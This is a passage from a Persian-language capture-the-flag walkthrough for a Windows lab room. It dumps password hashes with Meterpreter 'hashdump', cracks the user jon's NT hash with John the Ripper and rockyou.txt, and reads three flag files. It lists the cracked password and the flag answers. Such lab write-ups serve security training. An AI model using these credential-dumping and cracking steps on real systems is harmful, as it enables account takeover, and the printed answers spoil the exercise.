		1. ![[Pasted image 20240712182134.png]]
	1. `Meterpreter > hashdump`
		1. ![[Pasted image 20240712182411.png]]
	2. سپس مقدار هش را کپی میکنیم، فایلی جدید بنام `hash.txt` میسازیم و مقدار هش را در فایل Paste میکنیم.
		1. ![[Pasted image 20240712182751.png]]
2. *Cracking Non Default User*
	0. برای کرک مقدار هش ابتدا Wordlist(مثلا rockyou.txt) را آماده میکنیم.
	1. سپس بوسیله `John` و یا `hashcat` به کرک مقدار هش میپردازیم. استفاده از John در این مورد بهتر زیرا ماشین کارت گرافیک ندارد.
	2. `john -w="/usr/share/wordlists/rockyou.txt" hash.txt --format=NT`
		1. ![[Pasted image 20240712183401.png]]
	3. مقدار هش با موفقیت کرک شد و پسورد مورد نظر با موفقیت یافت شد.
3. *Answer TASK 4 Questions*
	1. اولین سوال میگوید *در شل Meterpreter کامند `hashdump` را اجرا کنید و نام یکی از یوزر های غیر پیشفرض ماشین را بگویید؟* جواب >> `jon`
		1. ![[Pasted image 20240712182627.png]]
	2. سوال دوم میگوید *مقدار کرک شده هش، یعنی پسورد اکانت `jon` چیست؟* جواب `alqfna22`
		1. ![[Pasted image 20240712183550.png]]
	3. پس از جواب دادن به این سوال میتوانیم به TASK 5 که Find Flags است برویم.
```sh 
"Terminal-1 msfconsole => In Meterpreter Shell on Target machine"
Meterpreter > hashdump
#Copy jon hash value in text file in named "hash.txt"

"Terminal-2 => Cracking jon account NT Hash"
touch ~/hash.txt ; echo HASHVALUE > ~/hash.txt ; locate rockyou.txt
john -w="/usr/share/wordlists/rockyou.txt" ~/hash.txt --format=NT
```
	![[Pasted image 20240712183323.png]]
##### TASK 5 - Find Flags
1. *Find Flags*
	0. در این مرحله باید چندین Flag که در ماشین ویندوزی کارگذاری شده است را پیدا کنیم. در واقع باید به شل Meterpreter بازگردیم و سپس برای پیدا کردن تمام فلگ ها از دستور زیر استفاده میکنیم.
		1. `search -f flag*`
			1. ![[Pasted image 20240712184404.png]]
		2. حال باید تک به تک این فلگ های یافته شده را با `cat` باز کنیم و مقادیر درون آنها را کپی کنیم و در پاسخ سوالات بنویسیم:
			1. ![[Pasted image 20240712231905.png]]
	1.  **فلگ اول** طبق راهنما اولین Flag در system root پیدا میشود بنابراین اولین فلگ را باز میکنیم >>
		1. `ls c:`
		2. `cat c:/flag1.txt`
			1. ![[Pasted image 20240712184619.png]]
		3. با باز کردن فایل توانستیم اولین فلگ را بدست بیاوریم. کافیست مقدار فلگ را کپی کنیم و در جواب سوال اول وارد کنیم. `flag{access_the_machine}`
	2. **فلگ دوم** طبق راهنما و همچنین نتیجه `*search -f flag` جستجو که انجام دادیم، در `Windows/System32/config/flag2.txt` قرار دارد. بنابراین کافیست فلگ را باز کنیم و مقدار درون فایل را کپی کنیم >>
		1. `cat Windows/System32/config/flag2.txt`
			1. ![[Pasted image 20240712185336.png]]
		2. دقت کنید در ویندوز از بک اسلش `\` استفاده میشود و در لینوکس از اسلش `/` و الان هم در ماشین لینوکسی هستیم بنابراین اگر آدرس ویندوزی را کپی میکنیم باید بک اسلش ها را به اسلش تغییر دهیم:
			1. ![[Pasted image 20240712185231.png]]
			2. ![[Pasted image 20240712185305.png]]
		3. در آخر کافیست مقدار فلگ را کپی کنیم تا در جواب سوال سوم آنرا وارد کنیم. `flag{sam_database_elevated_access}`
			1. ![[Pasted image 20240712185459.png]]
	3. **فلگ سوم** طبق راهنما و همچنین نتیجه `*search -f flag` جستجو که انجام دادیم، در `C:\Users\Jon\Documents\flag3.txt` قرار دارد:
		1. `search -f flag*`
			1. ![[Pasted image 20240712185745.png]]
		2. `cat C:/Users/Jon/Documents/flag3.txt`
		3. کافیست مقدار فلگ را کپی کنیم و در جواب سوال سوم بنویسیم.
		4. `flag{admin_documents_can_be_valuable}`
	4. یافتن فلگ ها هم تمام شد و در نتیجه Room Completed میشود.
2. *Answer TASK 5 Questions*
	1. *سوال اول* میگوید مقدار *فلگ اول* را بنویسید >> `flag{access_the_machine}`
		1. ![[Pasted image 20240712184851.png]]
	2. *سوال دوم* میگوید مقدار *فلگ دوم* را بنویسید >> `flag{sam_database_elevated_access}`
		1. ![[Pasted image 20240712185505.png]]
	3.  *سوال سوم* میگوید مقدار *فلگ سوم* را بنویسید >> `flag{admin_documents_can_be_valuable}`
		1. ![[Pasted image 20240712195045.png]]
3. *Completed Room*
	1. اگر جواب تمام سوالات را داده باشیم، تمرین ما در این اتاق تمام شده است و میتوانیم Room را ترک کنیم.
		1. ![[Pasted image 20240712195319.png]]
```sh
search -f flag*
cat c:/flag1.txt #Copy flag 1 value "flag{access_the_machine}"
cat Windows/System32/config/flag2 #Copy flag 2 value "flag{sam_database_elevated_access}"
cat C:/Users/Jon/Documents/flag3.txt #Copy flag 3 value "flag{admin_documents_can_be_valuable}"
```
### !